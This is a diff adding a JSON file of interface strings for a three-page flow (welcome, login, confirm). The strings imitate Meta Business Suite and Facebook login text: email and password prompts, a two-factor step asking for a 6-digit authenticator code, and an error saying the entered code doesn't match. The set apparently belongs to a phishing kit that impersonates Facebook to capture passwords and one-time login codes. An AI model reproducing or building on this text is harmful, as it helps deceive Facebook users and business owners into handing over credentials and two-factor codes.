@@ -1,0 +1,205 @@
+[
+    {
+        "code": "title_page_welcome",
+        "name": "",
+        "description": "Title Of Page Welcome",
+        "position": "common",
+        "language_id": 0
+    },
+    {
+        "code": "title_page_login",
+        "name": "",
+        "description": "Title Of Page Login",
+        "position": "common",
+        "language_id": 0
+    },
+    {
+        "code": "title_confirm_page",
+        "name": "",
+        "description": "Title Of Page Confirm",
+        "position": "common",
+        "language_id": 0
+    },
+    {
+        "code": "login_to_access",
+        "name": "",
+        "description": "Log in to access your professional tools",
+        "position": "welcome",
+        "language_id": 0
+    },
+    {
+        "code": "login_with_facebook",
+        "name": "",
+        "description": "Log in with Facebook",
+        "position": "welcome",
+        "language_id": 0
+    },
+    {
+        "code": "title",
+        "name": "",
+        "description": "Meta Business Suite",
+        "position": "login",
+        "language_id": 0
+    },
+    {
+        "code": "login_button_top",
+        "name": "",
+        "description": "Login (Button top)",
+        "position": "login",
+        "language_id": 0
+    },
+    {
+        "code": "create_account",
+        "name": "",
+        "description": "Create Account (Button top)",
+        "position": "login",
+        "language_id": 0
+    },
+    {
+        "code": "notice_desktop",
+        "name": "",
+        "description": "You must log in to continue.",
+        "position": "login",
+        "language_id": 0
+    },
+    {
+        "code": "error_notice",
+        "name": "",
+        "description": "The email address or mobile number you entered isn't connected to an account.",
+        "position": "login",
+        "language_id": 0
+    },
+    {
+        "code": "error_find",
+        "name": "",
+        "description": "Find your account.",
+        "position": "login",
+        "language_id": 0
+    },
+    {
+        "code": "login_box_title",
+        "name": "",
+        "description": "Log in to Facebook",
+        "position": "login",
+        "language_id": 0
+    },
+    {
+        "code": "email",
+        "name": "",
+        "description": "Mobile number or email address",
+        "position": "login",
+        "language_id": 0
+    },
+    {
+        "code": "password",
+        "name": "",
+        "description": "Password",
+        "position": "login",
+        "language_id": 0
+    },
+    {
+        "code": "submit",
+        "name": "",
+        "description": "Log In",
+        "position": "login",
+        "language_id": 0
+    },
+    {
+        "code": "forgotten",
+        "name": "",
+        "description": "Forgotten account",
+        "position": "login",
+        "language_id": 0
+    },
+    {
+        "code": "sign_up_to_facebook",
+        "name": "",
+        "description": "Sign up for Facebook",
+        "position": "login",
+        "language_id": 0
+    },
+    {
+        "code": "create_new_account",
+        "name": "",
+        "description": "Create new account (Bottom mobile)",
+        "position": "login",
+        "language_id": 0
+    },
+    {
+        "code": "log_out",
+        "name": "",
+        "description": "Log out",
+        "position": "confirm",
+        "language_id": 0
+    },
+    {
+        "code": "title_form",
+        "name": "",
+        "description": "Choose a way to confirm that it's you",
+        "position": "confirm",
+        "language_id": 0
+    },
+    {
+        "code": "sub_title_form",
+        "name": "",
+        "description": "Your account has two-factor authentication switched on, which requires this extra login step.",
+        "position": "confirm",
+        "language_id": 0
+    },
+    {
+        "code": "title_notice",
+        "name": "",
+        "description": "Approve from another device",
+        "position": "confirm",
+        "language_id": 0
+    },
+    {
+        "code": "sub_title_notice",
+        "name": "",
+        "description": "We already sent a notification to your logged-in devices. Check your Facebook notifications where you're already logged in to the account and approve the login to continue.",
+        "position": "confirm",
+        "language_id": 0
+    },
+    {
+        "code": "title_input_code",
+        "name": "",
+        "description": "Or, enter your login code",
+        "position": "confirm",
+        "language_id": 0
+    },
+    {
+        "code": "sub_title_input_code",
+        "name": "",
+        "description": "Enter the 6-digit code from the authentication app that you set up.",
+        "position": "confirm",
+        "language_id": 0
+    },
+    {
+        "code": "login_code",
+        "name": "",
+        "description": "Login code",
+        "position": "confirm",
+        "language_id": 0
+    },
+    {
+        "code": "need_another",
+        "name": "",
+        "description": "Need another way to confirm that it's you?",
+        "position": "confirm",
+        "language_id": 0
+    },
+    {
+        "code": "submit_code",
+        "name": "",
+        "description": "Submit Code",
+        "position": "confirm",
+        "language_id": 0
+    },
+    {
+        "code": "error_notice",
+        "name": "",
+        "description": "The login code you entered doesn't match the one sent to your phone. Please check the number and try again.",
+        "position": "confirm",
+        "language_id": 0
+    }
+]
